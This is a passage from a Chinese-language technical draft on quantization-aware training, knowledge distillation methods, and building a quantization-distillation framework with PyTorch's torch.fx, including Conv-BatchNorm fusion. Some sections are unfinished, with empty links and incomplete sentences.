<p>观察量化表达式会发现，从浮点数到定点数会有一个取整的过程，这个round取整函数实际上是没有办法进行求导的，这在训练后量化的模型中没有问题，但是在量化后训练的方式中会有求导的问题，因为神经网络是一种依靠求导得到梯度，在通过将参数向梯度方向移动求得最小值的一种方法，因为round函数的存在，则必须要寻找一种方案去代替求导的方案，一种方案是使用STE(Straight-through
estimator)的方法，他的思路是将round的导数视为1，这可以在反向传播部分将他写上，方法简单直接，效果也非常好，以至于一直以来量化领域一直使用这种方法进行量化后训练的反向传播，</p>
<p><a
href="https://zhuanlan.zhihu.com/p/570322025">请在这里分析STE的数学原理</a></p>
<p><img
src="https://pic1.zhimg.com/v2-c3b5f595b8680eb04e609ec2b85e9bec_r.jpg"
alt="量化后反向传播" />; <img
src="https://pic1.zhimg.com/80/v2-a74fade2b52cb69d8d4323aef05db3bc_720w.jpg"
alt="量化后反向传播" />
当前也有人对其进行过改进，就是使用一些特殊的函数去模拟round函数，例如sigmod其与取整函数很相似，经过叠加之后就可以达到round函数的效果，DSQ论文只能怪就是使用了这样的方法，也有人严谨分析了STE的做法提出了多级量化反向传播的方案</p>
<h5 id="量化训练的主要流程">量化训练的主要流程</h5>
<p>在量化推理中，为了达到最好的训练效果，除了有良好的量化方法，还需要再训练上使用最佳的方法，如果训练的步骤不正确则会导致整个方法变差，经过多次量化实践可以总结出的训练步骤有如下几条：</p>
<ol type="1">
<li>量化后的模型不要从头开始训练，因为量化感知训练需要进行激活值分布的统计，如果从头开始最开始的激活值的分布是不满足后续训练好的模型，最终模型会进入一个比较差的状态。所以最佳的做法应该是一开始加载原模型，或者在模型加一个开关，控制模型是否进行量化训练，将未量化状态的模型训练到最优，此时打开量化开关进行量化感知训练。</li>
<li>统计激活值分布，确定激活值的量化范围是什么，有助于后续量化参数的确定。激活值分布统计次数不宜过多，一次足以，多次的统计会让模型难以收敛，因为统计后的参数会让模型中每一层的输入发生变化，造成模型又一次重新训练。</li>
<li>可以使用batchnormal和relu6等能规范化输入的层使得层与层之间的参数相互独立，每一层的激活值分布较为固定，这样激活值统计情况比较准确，但是batchnormal对于卷积操作或者全连接操作过程中的逐层量化方法影响比较大，因为batchnormal层学习了偏移和缩放的参数，会使得通道与通道之间的分布差异越来越大，使得逐层量化不再使用</li>
<li>网络设计时参数越多其鲁棒性越好，因为参数越多，冗余越多，越能抵挡的住量化带来的精度损失。</li>
</ol>
<figure>
<img src="" alt="量化训练流程图" />
<figcaption aria-hidden="true">量化训练流程图</figcaption>
</figure>
<h2 id="蒸馏">蒸馏</h2>
<p><a
href="小绿鲸中的“知识蒸馏综述”">知识蒸馏综述，相关论文请在原文查找</a></p>
<p>深度学习是人工智能成功的基础，大规模深度模型已经取得了压倒性的成功，但巨大的计算复杂性和巨大的存储需求使其在实时应用中部署成为一个巨大的挑战，知识蒸馏主要解决的问题和量化相同，作为一种代表性的模型压缩和加速方法，知识蒸馏可以从较大的深度神经网络提取到较小的网络中，，得到了越来越多的关注，由于本文也是用了蒸馏方法，这里简要介绍一下蒸馏的相关内容。</p>
<h3 id="蒸馏的发展">蒸馏的发展</h3>
<p>Bucilua等人（2006）首先提出从大模型或模型集合转移到训练小模型中，同时网络输出精度并没有所下降。Urner等人，2011提出在半监督学习中，使用未标记数据和教师网络的输出来监督学生网络来进行学习，从这之后，从大模型中向小模型学习就叫做了知识蒸馏。知识蒸馏主要的步骤是学生网络模仿教师网络的输出以及中间的一些结果，从而获得学习到教师网络中的一些特征等一些东西，产生更好的效果。有了这个转移的思路，后面单位问题就主要是如何进行知识的转移，知识蒸馏主要分为三个部分：知识、师生架构，提炼算法。</p>
<figure>
<img src="knowledge_disstrill.png" alt="knowledge_disstrill_框架" />
<figcaption aria-hidden="true">knowledge_disstrill_框架</figcaption>
</figure>
<p>尽管知识蒸馏很有效，但是关于知识蒸馏的书籍并不是很多，Urner等人（2011）证明了使用没有标签的数据集和教师模型与学生网络进行知识蒸馏的过程是PAC可学习的，为了理解知识蒸馏的工作原理，（Phuong和Lampert）（2019）给出了一个知识蒸馏的理论依据，这个理论给出了知识蒸馏中学生网络学习的内容和学生网络学习的速度，并阐明知识蒸馏成功的原因以及必要条件，一个成功的知识蒸馏需要依赖于数据集，学生网络学习的目标，以及用于学习的损失函数。
<a
href="Cheng,%20X.,%20Rao,%20Z.,%20Chen,%20Y.,%20&amp;%20Zhang,%20Q.%202020.Explaining%20Knowledge%20Distillation%20by%20Quantifying%20the%20Knowledge.%20In:%20CVPR.">Cheng</a>
等人从深度神经网络的中间层的可视特征来解释知识蒸馏， <a
href="Ji,%20G.,%20&amp;%20Zhu,%20Z.%202020.%20Knowledge%20Distillation%20inWide%20Neural%20Networks:%20Risk%20Bound,%20Data%20Efficiency%20and%20Imperfect%20Teacher.%20In:%20NeurIPS.">Ji和Zhu</a>的理论从数据效率教师网络不完善等方面解释了知识蒸馏在神经网络中的作用。[Cho和Hariharan]对知识蒸馏中大模型的作用进行了详尽的证明，其表明较大的模型未必就是更好的老师，可能会对学生网络的学习造成不利的影响，Tang
等认为知识蒸馏可以用来做教师网络的准确性评估以及最佳模型网络结构的探索。</p>
<p>受到人类的学习模式的启发，知识蒸馏出现了多种多样的方式，teacher-student
learning（Hinton et al.，2015）、mutual learning（Zhang et
al.，2018b）、assistant teaching （Mirzadeh et al.，2020）、lifelong
learning（Zhai et al.，2019）和self learning（Yuan et
al.，2017），知识蒸馏的大多数扩展都集中在深度学习网络上，由此产生产生的轻量网络可以部署在边缘设备上。受到模型压缩和知识提取的启发，数据集提取也出现了，它用于将知识从大数据集转移到小数据集，从而减轻模型训练时的载荷。
（pdf第三页）</p>
<h3 id="蒸馏的基本概念">蒸馏的基本概念</h3>
<p>知识蒸馏中，</p>
<h4 id="蒸馏的种类">蒸馏的种类</h4>
<p>根据蒸馏的特征不同可以将蒸馏分为如下：</p>
<ol type="1">
<li>基于响应的知识蒸馏
这种方式主要是使用教师的最终输出作为学生网络的学习对象，基于相应的知识蒸馏简单有效，其损失函数如下：
<span class="math display">\[
L_{ResD}(Z_t,Z_s) = L_R(Z_t,Z_s)
\]</span> <span class="math inline">\(L_R\)</span>是logits的KL散度,<span
class="math inline">\(Z_t,Z_s\)</span>是网络的logits，即全连接层输出的未归一化的概率，主要目的就是让学生网络及尽量贴合教师网络，方法简单有效，(Hinton
et al.,2015; Ba and Caruana,
2014)等人使用温度参数实现了对软目标的学习，在图像分类中比较流行，其将原来的<span
class="math inline">\(Z_t\)</span>变为如下向量：</li>
</ol>
<p><span class="math display">\[
p(z_i,T) = \frac{exp(z_i / T)}{\sum_{j}exp(z_j/T)}
\]</span> 其中T为温度参数，用于控制蒸馏目标的重要性，于是损失函数变为：
<span class="math display">\[
L_{ResD}(p(z_t, T), p(z_s, T)) = L_R(p(z_t, T), p(z_s, T)) .
\]</span></p>
<p>然而基于反应的知识蒸馏比较依赖于最后一层的网络输出，无法获得教师网络中的中间输出，这对于网络学习神经网络深层信息没有帮助，由于logits只是概率分布，所以基于响应的知识蒸馏常用在监督学习上</p>
<ol start="2" type="1">
<li>基于特征的知识蒸馏</li>
</ol>
<p>深度神经网络因为足够的深，擅长学习更为抽象的信息，从而形成更为抽象的特征，因此最后一层和中间层的输出，即特征图，都可以作为学生模型学习的对象。特征图是对知识基于相应的更好的扩展，基于特征的知识蒸馏就是对神经网络更深层次的特征进行学习的一种方案。Romero等人，2015在fitnet中引入基于特征的知识蒸馏，主要做法是匹配教师和学生的特征激活，后续(Zagoruyko和Komodakis，2017；Kim等人，2018；Heo等人，2019c；Passban等人，2021；Chen等人，2021年；Wang等人，2020b）参照此法提出了多种特征蒸馏方案。Huang和Wang(2017)使用神经元选择性转移，Passails和Tefas通过对特征空间概率分布进行学习来实现知识蒸馏，Kim等人使用一种叫做factor一种中间形式来缩小教师和学生网络了之间的差距，Chen等人提出了夸层知识学习，通过注意力机制为每个学生网络层分配一个合适的教师层去学习，等等。</p>
<figure>
<img src="feature_diss_method.png" alt="feature_diss_method_table" />
<figcaption aria-hidden="true">feature_diss_method_table</figcaption>
</figure>
<p>通常来讲，特征蒸馏的损失函数能被公式化为 <span
class="math display">\[
L_{FeaD}(f_t(x),f_s(x)) = L_F(\phi_{t}(f_{t}(x)), \phi_{s}(f_s(x)))
\]</span> 其中<span class="math inline">\(f_t{x}\)</span>和<span
class="math inline">\(f_s(x)\)</span>表示的是教师网络和学生网络中间层的特征图，同时<span
class="math inline">\(\phi(f_t(x))\)</span>和<span
class="math inline">\(\phi(f_s{x})\)</span>表示的是教师网络和学生网络中特征图的映射，因为教师网络和学生网络结构不一致，所以有可能会出现学生网络学习教师网络的特征向量尺度不一致，需要一个函数来进行特征的变形，<span
class="math inline">\(L_F\)</span>表示特征相似性函数，这个函数应该在特征越相似的情况下大小越小，使得能够很好的进行优化。特征蒸馏的损失函数具体来说有<span
class="math inline">\(L_2(.)、L_1(.)、L_{CE}(.)\)</span>以及<span
class="math inline">\(L_{MMD}(.)\)</span>，分别是L2范数距离损失，L1范数距离损失，交叉熵损失函数和最大平均差异损失。尽管特征知识能为学生网络提供有用的知识，但是选择哪些层进行特征蒸馏是一个有待讨论的问题，本文提出了一种使用激活值hessian矩阵的方法来判断特征的重要性，使用数学推导来判断修改某一层参数发生改变之后会对整个结果造成怎样的影响，依次来决定蒸馏的对象，后文将进行展开描述。</p>
<figure>
<img src="feature蒸馏流程.png" alt="feature蒸馏流程" />
<figcaption aria-hidden="true">feature蒸馏流程</figcaption>
</figure>
<ol start="3" type="1">
<li>基于关系的知识蒸馏</li>
</ol>
<p>基于反应和基于特征的蒸馏方式都是用教师模型中特定的层作为学习对象，这仅仅学习了单独层的特征信息，却忽视了整个网络中其它层之间的关系信息，基于关系的知识蒸馏继续深入探索了网络中权重和权重之间以及权重和数据样本之间的关系，一般就特征图关系的关系知识蒸馏损失函数可以公式化为：
<span class="math display">\[
L_{RelD}(f_{t},f_{s}) = L_{R^{1}}(\phi(f_{t1},f_{t2}),\phi(f_{s1},
f_{s2}))
\]</span> <span class="math inline">\(f_t\)</span>和<span
class="math inline">\(f_s\)</span>分别是教师网络和学生网络的特征图对,<span
class="math inline">\(f_{t1},f_{t2}\)</span>是教师网络中选中的特征对，相应的<span
class="math inline">\(f_{s1},f_{s2}\)</span>是学生网络中选出的特征对，<span
class="math inline">\(\phi()\)</span>函数表示的是特征对相似性函数<span
class="math inline">\(L_{R^{1}}\)</span>表示蒸馏过程中的特征损失函数，关系之间的相似学习就是通过这个损失函数来实现的，</p>
<figure>
<img src="relationship_distillation.png"
alt="relationship_distillation" />
<figcaption aria-hidden="true">relationship_distillation</figcaption>
</figure>
<h4 id="蒸馏的方案">蒸馏的方案</h4>
<ol type="1">
<li>离线蒸馏</li>
</ol>
<p>以前大多数蒸馏方案都是离线的，蒸馏预训练好的模型转移到学生模型，整个训练过程分为两步，首先使用一组训练样本在大的教师模型上进行训练，然后将训练好的教师模型提取logits或者网络的中间特征，将提取的结果用于学生网络的训练。第一步和往常训练一样，假定教师网络是与训练好的模型，所以离线方法的注意力交点主要在学生网络的结构上，以及如何定义教师网络的知识。离线方法的主要优点是简单且易于实现。教师网络可能在其他机器上训练，而用于提取知识的网络在其他机器上训练，这极大的方便了蒸馏的实施。离线蒸馏方法采用的是单方向的知识转移和两阶段训练，所以教师网络大模型的复杂的训练过程是不可避免的，同时学生网络和教师网路之间的性能差距始终存在，学生的性能很大程度上依赖与教师网络的性能。</p>
<ol start="2" type="1">
<li>在线蒸馏</li>
</ol>
<p>尽管离线蒸馏方案实施简单有效，但是离线蒸馏也有一些问题，为了克服离线蒸馏的限制，有人提出了在线蒸馏方案以进一步的提高学生网络的性能，尤其是在教师网络参数量不大的情况下。在线蒸馏中，教师网络没有进行预训练，但是教师网络会和学生网络一同进行训练，虽然在线蒸馏是一种具有高效并行的端到端的训练方案，在线训练方案通常无法容忍较大的教师模型，本文也采用了在线蒸馏方案，但是本文的蒸馏方案很好的避开了教师网络模型交到的问题。</p>
<ol start="3" type="1">
<li>自蒸馏</li>
</ol>
<p>子蒸馏中，教师网络和学生网络使用的是同一个网络，这可以视为在线蒸馏的一种特例，他将网络中较深部分的知识提炼成较浅部分的知识，自蒸馏就像人类在自学知识一样，不需要其他的教师网络模型。</p>
<p>离线蒸馏、在线蒸馏、自蒸馏可以结合起来使用，可以进行优势互补。</p>
<h2 id="量化与蒸馏">量化与蒸馏</h2>
<p>量化与蒸馏</p>
<p>Yoojin Choi, Jihwan Choi, Mostafa El-Khamy, Jungwon Lee; Proceedings
of the IEEE/CVF Conference on Computer Vision and Pattern Recognition
(CVPR) Workshops, 2020, pp. 710-711
Yoojin等人提出了无数据的对抗性知识蒸馏，它最小化了来自生成器的任何对抗性样本的教师和（量化）学生的输出之间的最大距离。但是主要工作还是在目标检测网络中</p>
<p>QKD: Quantization-aware Knowledge Distillation
Kim等人提出了量化与知识蒸馏相结合来解决模型压缩问题，使用了三个阶段训练，自学习阶段对没有的量化低精度学生网络进行微调，以获得良好的初始化。其次，共同学习阶段训练一名教师。最后，辅导阶段将知识从受过培训的教师转移给学生。但是</p>
<p>Model compression via distillation and quantization
Polino等人提出了两种新的压缩方法，联合利用权重量化和将较大的教师网络蒸馏为较小的学生网络。第一种方法称为量化蒸馏，在训练过程中利用蒸馏，将相对于教师表示的蒸馏损失合并到学生网络的训练中。第二种方法是可微量化，通过随机梯度下降优化量化点的位置，以更好地拟合教师模型的行为。量化的浅层学生可以达到与全精度教师模型相似的准确度水平。</p>
<p>PQK: Model Compression via Pruning, Quantization, and Knowledge
Distillation</p>
<p>kim等人提出了一种新颖的模型压缩方法，称为pqk，由剪枝、量化和知识蒸馏过程组成。与传统剪枝和蒸馏不同，pqk利用剪枝过程中剪枝的不重要权重来制作教师网络，用于训练更好的学生网络，而无需预先训练教师模型。
pqk有两个阶段。第一阶段利用迭代剪枝和量化感知训练来创建轻量级且节能的模型。在第二阶段，我们通过将第一阶段中未使用的不重要权重添加到修剪后的网络中来创建教师网络。通过使用这个教师网络，我们将修剪后的网络训练为学生网络。这样不需要为蒸馏框架预先训练教师网络，因为教师网络和学生网络共存于同一网络中。但是这样无法再原先未量化得工作上建立更好的结果。</p>
<h2 id="图像评价指标psnr">图像评价指标PSNR</h2>
<p>(Peak Signal-to-Noise Ratio,
PSNR)通常被用作图像评价指标，因为其提供了一个关于参考图像和对比图像之间相似性的衡量标准，提供一个图像发生变化程度的衡量指标，以评估图像的质量。</p>
<h1 id="量化框架开发">量化框架开发</h1>
<p>一般的神经网络框架主要目的是提供一种量化部署前的训练问题的，在没有量化框架前，手动实现一个量化方法需要考虑一些问题，首先STE反向传播过程由于需要增加，并且计算方式需要以整数量化的方式进行，例如卷积，卷积在pytorch中使用函数将底层计算严格的封装，这些计算方式不能由神经网络计算库中现有的函数提供，所以这就需要我们重新从神经网络库中重新将原来已经存在得模块改写，完成我们自身需要的量化逻辑，这本身是一个很大的工程，并且经过改动之后训练代码和量化框架会高度耦合，不方便再次利用。经过技术的革新，一些网络库也逐渐支持量化相关操作，但是这些量化组件需要很深刻的理解内部运行才能完成良好的量化工作，虽然现阶段借助于上述技术已经产生了很多框架，但是这些框架仅仅只支持量化，却不支持蒸馏，本工作参考了商汤以及华为的一些量化框架的实现，其中一个重点就是将量化蒸馏方案写成一个框架形式，方便各种类型的网络进行使用，在这里也是用了很多的pytorch中的技术，如torch.fx,torch.qat等等一些主要值得一提的技术</p>
<h2 id="torch.fx简介">torch.fx简介</h2>
<p><a
href="http://giantpandacv.com/project/PyTorch/%E7%94%A8%E6%B2%90%E7%A5%9E%E7%9A%84%E6%96%B9%E6%B3%95%E9%98%85%E8%AF%BBPyTorch%20FX%E8%AE%BA%E6%96%87/">首先对fx进行介绍</a>
最开始pytorch训练框架本身不像tensorflow那样支持计算图的抽取，所以pytorch很难在网络代码固定之后再通过一些条件来修改网络结构实现动态图计算的功能，在一些真实场景中用户还是需要使用动态图来改变网络结构来进行神经网络性能方面的调整，在pytorch.fx出现之后，pytorch可以对网络计算图进行捕获和转换，实现了动态图计算。</p>
<p>神经网络框架分为两种，分别是静态图框架和动态图框架，Pytorch、Caffe、TensorFlow之间的不同点就是这几种方法的计算图是不一样的，pytorch每次计算使用新的图，TensorFlow进行主要使用静态图进行计算，所以TensorFlow中在运行模型前就将计算图的情况确定好了,两者的区别在于，静态图需要先构建在执行，好处在于可以将一些操作进行优化，例如，合并相关的算子，将常数折叠到其他网络中去。当前缺点也是有的，就是只有在网络运行之后才能看到相关的变量值。动态图是运算和构建同时进行的图，其好处在于网络搭建的过程中能够看到相关的变量值，可以方便的检查网络结构等正确性，但是缺点也有，由于是计算图是动态构建的，不知道一个操作后面的操作是什么，这就造成了后续优化很困难。
在pytorch.fx之前的一些静态图框架，如Caffe，还有TensorFlow，其设计了一个用于表示图的数据结构，只要用户调用相应的API就能实现对IR的修改和构建，之后得到这个计算图之后就可以进行各种需要的操作，如：并行加速、量化、性能优化等等，但是此类工具用起来比较难，并且一些开发环境比较麻烦，比如说需要使OneFlow实现上述功能，那么最终都是需要使用c++进行开发，同时在调试的过程中还需要掌握gdb以及pdb的使用命令，难以进行操作。到如今动态图已经发展起来，动态图由于其自身原因不能进行预测性结构改动的任务，这在静态图中很容易，动态图很难，Pytorch等使用动态图的框架急需改变这种处境，使得其可以使用户可以从用户的图程序中捕获出这种图结构来进行结构替换，以完成量化或算子融合。于是在之后Pytorch的发展中引入了TorchScript，其基于python程序中的AST来对网络IR进行构造，对整成程序进行整体建模，但是这样的方法会带来一些问题，就是这类操作的工程量太大，无论从技术方面还是从时间方面，并且在这样一个变换之中进行性能优化，量化结构替换，层融合操作将会更加困难。如果要改进这套方案的话需要简化一些操作，将原本对整个程序构建IR的方法改为对网络构建DAG（有向无换图）结构，然后提供一些对这个DAG图中的节点结构做替换的API来完成算子结构的修改，而不需要程序中隐藏的更高层的api结构，例如对卷积或者批标准化层操作的API。</p>
<p>Pytorch.fx实际上就满足上述所说的用户的需求，其能抽取神经网络计算相关的DAG图。通过官方给出的简单易用的修改计算图的接口，pytorch.fx就能很方便实现深度学习中的相关变换需求。这里总结一下其相关的核心功能：
1. 对神将网络的计算图捕获以及计算图的转换 2.
将神将网络中的计算简单的分为6种IR，用于表示捕获的计算节点中计算类型 3.
将变换后的计算图重新生成代码嵌入到相关位置</p>
<h2 id="torch.fx的相关原理及使用">torch.fx的相关原理及使用</h2>
<h3 id="torch.fx如何构建计算图">torch.fx如何构建计算图</h3>
<p><a href="https://zhuanlan.zhihu.com/p/644590863">参考自</a></p>
<p>如果表达式的计算过程比较简单，那么对于计算图的绘制就会很容易，反之会很困难，但是在神经网络计算中，各种各样的计算都会出现，而且Pytorch是通过动态图进行计算的，所以中间出现的计算会更复杂，如条件语句，张量变形，一些深度学习中常用的一些包如numpy中的计算以及python和其他语言进行进行联合计算，如python调用c++中的相关算子，这些操作都会导致计算图的生成困难。pytorch.fx中基于历史原因给出了三种计算图的捕获方案，每一种方案能力都在变强，pytorch.fx最开始的版本中解决方案是使用符号追踪，符号追踪是一种将模型进行计算的过程，他使用Proxy作为伪输入，默认假设所有函数的参数都是Tensor，其不需要真正的运行，只需要相关的函数信息，就能模拟一次计算，在计算过程中Proxy会记录计算中执行的各种操作，这个方法的好处在于不需要进行实际的计算，缺点也是有的，就是张量的大小是没法知道的，如果有一次张量的切片或者其他的计算会导致运行出错的问题，更具体的说就是没有办法对变量的具体形式（如shape，dtype，requires_grad）做追踪。之后的pytorch.fx在升级的过程中修改了这一问题，在生成计算图时，除了需要一个Proxy之外，还需要一个torch张量用来模拟真实的运算情况，这种追踪计算图的方式叫做即时追踪，这样就解决了shape等参数无法得到的问题，即时追踪一般是指在运行时使用真实的输入数据进行追中，并且在追踪过程中计算预定义算子来实现计算图。及时追中仍然有一些问题，因为不同的输入，网络表现可能是不一样的，但是在构建计算图的时候却给出了一个特殊的输入，导致一些条件分支内的计算没有表现在计算图中，比如dropout和batchnormal层的操作在训练和推理时的运行计算过程是不一样的。基于这个问题pytorch.fx给出了最终的解决方案，使用动态优化，主要思路是将所有的函数调用进行统计，通过对字节码分析从中获取计算图以及相应计算图的触发条件。当前上述三种捕获计算图的方法都存在，由于网络结构并没有过于难处理的结构，所以在构建计算图的过程中使用符号追踪的方案。</p>
<h3 id="torch.fx中间表示方式">torch.fx中间表示方式</h3>
<p>构建的计算图有一些比较重要的参数，主要可以分为几类，一类表示的是与操作相关的数据如操作类型opcode，输入参数args，一些固定参数kward，操作使用的函数target，还有一类是用于表示计算结构的数据，如name表示输出名字，args表示所需输入名字，args里面的参数就是和name相关的，通过这两组数据就建立计算图的DAG。这里重点介绍一下opcode以及target参数。</p>
<p>opcode主要有6中，分别是</p>
<ul>
<li>placeholder用于表示计算图的输入</li>
<li>get_attr表示当前节点的操作是用来获取某些模块中的参数，例如在网络中有有操作单独将网络中某一层模块中的权值拿出来参与计算，这就是get_attr操作</li>
<li>call_function表示调用了一些python中自带的函数，其target就表示其将使用的操作是什么，例如两个整除的加法操作。</li>
<li>call_module表示其调用的方法是网络中的一些层操作，target表示的就是相关的操做名称在模型中模块的名字，例如卷积操作。</li>
<li>call_method表示调用torch函数，这个和call_module不同，函数是一些没有参数的模块。</li>
<li>output表示网络输出的是哪些东西。</li>
</ul>
<p>target表示的是节点计算使用的函数，如果数据计算使用的是网络中的模块名，target也会相应的与此模块名一致，同时opcode是call_module或call_method。如果调用是python内置的函数target会是相应的函数名与网络模块无关。</p>
<h3 id="torch.fx修改网络时的使用流程">torch.fx修改网络时的使用流程</h3>
<p>symbolic tracing -&gt; intermediate representation -&gt; transforms
-&gt; Python code generation 1. 获取计算图</p>
<p>首先使用符号追踪将网路的计算图拿到，计算图的结构如同一个链表一样，后续将这个链表修改。</p>
<ol start="2" type="1">
<li>修改计算图中节点，并修改模型相应的层</li>
</ol>
<p>这步是修改网络中的重点，利用拿到的计算图，根据自己写好的规则进行节点替换或增加节点，如果替换节点或增加节点的操作使用的是pytorch中的一些网络模型，那么在目标神经网络中还要添加相应的层，防止target指向的对象不正确。</p>
<ol start="3" type="1">
<li>检查计算图</li>
</ol>
<p>网络计算图修改之后，可能会因为粗心发生网络拓扑结构出现一些环状等不符合DAG条件的结构，所以需要调用相应的api对其进行计算图的检查，检查合格之后会进入最终代码生成阶段。</p>
<ol start="4" type="1">
<li>生成目标代码</li>
</ol>
<p>使用torch.fx的最终阶段就是代码的生成，torch.fx的工作方式和函数不一样，他不会像生成一个对象那样，后续去调用对象即可，而是选择生成python源码来进行最终的计算，</p>
<h2 id="torch.fx实现量化蒸馏方案">torch.fx实现量化蒸馏方案</h2>
<h3 id="方案配置">方案配置</h3>
<p>修改配置方案时，主要是通过网络中的层名来配置相应层的一些参数，但是由于网络中在定义层和定义计算流程的过程是分离的，一些层的定义之后可能会使用多次，这对量化和蒸馏是有一些麻烦的，例如得到relu层输出进行蒸馏或者对某一层之后的activation进行特殊量化处理会有些定位难得问题，这里的处理思路是首先对复用的一些层进行复制，修改计算图中使用复用层节点的target名称，然后将网络中相应的层名字进行新增，由于网络图进行了修改，这里通过对模型生成onnx模型再使用Netron去可视化网络，然后找出需要进行蒸馏以及特殊量化的层。写入配置文件。</p>
<h3 id="torch.fx实现蒸馏">torch.fx实现蒸馏</h3>
<p>本工作主要使用的是特征的蒸馏，所以需要输出一些中间特征，主要方案是修改网络中的output操作，通过yaml配置文件中的输出层名字来确定输出的层。</p>
<p>蒸馏需要两个网络都输出网络中间层的特征。一种是对量化之后网络层特征的输出，另一种是对未量化的网络层特征的输出。对于如上功能有两种设计方案，一种是量化时借用其符号追中进行量化的处理，然后非量化网络重新使用符号追踪再次进行蒸馏处理。另一种方案是单独设计一个模块，将量化网络和非量化网络都视为一类网络，然后重新进行符号追踪和蒸馏层输出。显然第二种方法的工作量和结构耦合是最小的，所以蒸馏单独成一个模块进行设计。</p>
<p>至于蒸馏层位置的选择如何处理，主要是用hessian矩阵进行处理，我们会在后文进行交代</p>
<h3 id="torch.fx实现量化">torch.fx实现量化</h3>
<h4 id="量化模型加载原模型参数">量化模型加载原模型参数</h4>
<p>根据前文所述，量化过程中想要达到最好的结果最好需要加载原模型来重新训练，以往的做法需要首先实现一个量化相关的层然后，层中使用一个开关，首先进行无量化训练，达到最好的结果在进行量化训练，但是这样的训练过程较为麻烦，同时也无法将原模型中参数加载到量化模型中。但是使用torch.fx对计算图操作是可以达到这样的效果的，再量化之前先进行原模型的加载，在进行层替换的时候首先将网络中的参数进行调换，然后再修改计算图，就完成了量化模型加载了原模型的参数。</p>
<h4 id="量化中的算子优化">量化中的算子优化</h4>
<p>在神经网络中，算子是最小的调度单位，但是算子并不具有原子性，一个复杂算子可以由多个简单算子组成。在量化推理的过程中，有时会使用类似于TensorFlow静态图优化的方法进行算子的优化。算子融合的目的主要有几个
1. 适配开发板计算算子</p>
<p>一些开发板对于神经网络提供的框架并不是完全支持，例如卷积算子，在开发板上并没有相应的算子，但是开发板支持矩阵操作，所以可以将卷积转化为相应的多个矩阵操作即可。</p>
<ol start="2" type="1">
<li>进行计算优化</li>
</ol>
<p>计算优化也分为两种，一种是适用于特定硬件的优化专用优化，另一种是对大多数硬件都适用的通用优化。</p>
<ul>
<li>通用优化</li>
</ul>
<p>这部分优化不考虑硬件，主要工作是对计算图相应的结构进行搜索然后将其替换为更优的结构。深度学习的算子可以分为两种：计算密集型算子和访存密集型算子，这也是大部分计算机中计算操作的类型，计算密集型算子其绝大多数时间花费在计算上，例如卷积和全连接层，虽然这两个算子需要访问其weight参数，但是其需要做矩阵计算操作，这部分的计算时间是远远大于访存时间的。访存密集型算子，这些算子的时间绝大多数花费在访存上，例如ReLU，其计算的时候先加载数据然后通过判断矩阵的值就能得到之后的结果，所以操作的主要耗时出现在访存上，一把来讲在设计网络的过程中，多半的操作都是计算密集型和访存密集型操作前后使用，利用两种结构的特点，我们可以将计算密集型的结果放在内存中，之后访存密集型的结构就不需要再去读数据直接使用上一步的操作数进行计算。</p>
<p>一类结构就是使用Conv +
ReLU，ReLU是访存密集型算子，Conv是计算密集型算子，这里可以将Conv计算结果直接交给RelU使用，两个算子就合并为一个算子了，这样就减轻了ReLU的访存压力，提高了计算效率。
<img src="Conv_Relu_fuse.png" alt="Conv_Relu_fuse" /></p>
<p>神经网络中一些算子的计算实际上也可以进行数学上的合并，比如Conv +
BatchNormal，也能进行层融合，不过BatchNormal的层融合需要分析一下BatchNormal的计算方式来进行融合。
在训练时BatchNormal中的计算方式如下： <span class="math display">\[y_i =
\gamma \frac{x_i - \mu}{\sqrt{\sigma ^2 + \varepsilon}} +
\beta\]</span></p>
<p>其中<span
class="math inline">\(\varepsilon\)</span>是一个防止除0的小量，<span
class="math inline">\(x_i\)</span>表示的是BatchNormal的输入数据，<span
class="math inline">\(\gamma、\beta\)</span>是BatchNormal中的可训练参数，通过梯度下降法来确定参数，<span
class="math inline">\(\mu\)</span>和<span
class="math inline">\(\sigma\)</span>表示的是根据x的均值和方差迭代计算出的，公式为：</p>
<p><span class="math display">\[
\mu_k = \lambda\mu_{k - 1} + (1 - \lambda) \mu_x
\]</span> <span class="math display">\[
\sigma_{k}^2 = \lambda\sigma_{k - 1}^2 + (1 - \lambda) \sigma_x^2
\]</span></p>
<p>为这个时候的计算不好进行优化，因为<span
class="math inline">\(\mu,\sigma,\gamma,\beta\)</span>一直在进行变化。观察推理阶段BatchNormal做了哪些操作：</p>
<p><span class="math display">\[y_i = \gamma \frac{x_i -
\mu}{\sqrt{\sigma ^2 + \varepsilon}} + \beta =
\frac{\gamma}{\sqrt{\sigma^2 + \varepsilon}} x + (\beta -
\frac{\gamma\mu}{\sqrt{\sigma ^ 2 + \varepsilon}})\]</span></p>
<p>将上式子进行修改，可以得到如下表达式：</p>
<p><span class="math display">\[
y = ax + b;
\]</span>
因为训练阶段参数已经确定，a,b才是个定值，这个时候进行优化才能真正的优化计算速度。这里分析上式子的x，假设其由卷积得来，那么有：</p>
<p><span class="math display">\[
x_i = w_1 \cdot z_1 + w_2 \cdot z_2 + w_3 \cdot z_3 + bias
\]</span> 其中<span
class="math inline">\(w_i\)</span>表示卷积中的权重，bias表示的是偏置值，z_i表示的是输入值，将上式与BatchNormal计算公式进行联立可得：</p>
<p><span class="math display">\[
y_i = ax_i + b = a(bias + \sum w_i \cdot z_i) + b;
\]</span> 变形之后会得到： <span class="math display">\[
y_i = ax_i + b = (\sum aw_i \cdot z_i) + (b + a \times bias) ;
\]</span></p>
<p>可以看出，BatchNormal在与Conv进行合并的过程中，需要将卷积的权值扩大a倍，并将bias改为<span
class="math inline">\(b + a \ times
bias\)</span>即可完成两个层的合并。</p>
<figure>
<img src="Conv_BatchNormal_fuse.png" alt="Conv_BatchNormal_fuse" />
<figcaption aria-hidden="true">Conv_BatchNormal_fuse</figcaption>
</figure>
<p>，本工作量化框架主要使用了这两个常用的优化的方案。</p>
<ul>
<li>专用优化</li>
</ul>
<p>这种优化需要从开发板角度考虑，将板子中提供的一些算子加入和网络中的一些算子进行相关转化，以此达到最快的计算速度，这并不在本工作的工作范围内，所以并不考虑。</p>
<p><a
href="https://openmlsys.github.io/chapter_backend_and_runtime/graph_optimizer.html"></a>
<a
href="http://acodespace.com/archives/%E6%B5%85%E5%B0%9D%E8%AE%A1%E7%AE%97%E5%9B%BE%E4%BC%98%E5%8C%96%E7%AE%97%E5%AD%90%E8%9E%8D%E5%90%88"></a></p>
<h4 id="量化层参数的配置">量化层参数的配置</h4>
<p><a href="https://pytorch.apachecn.org/1.4/88/"></a></p>
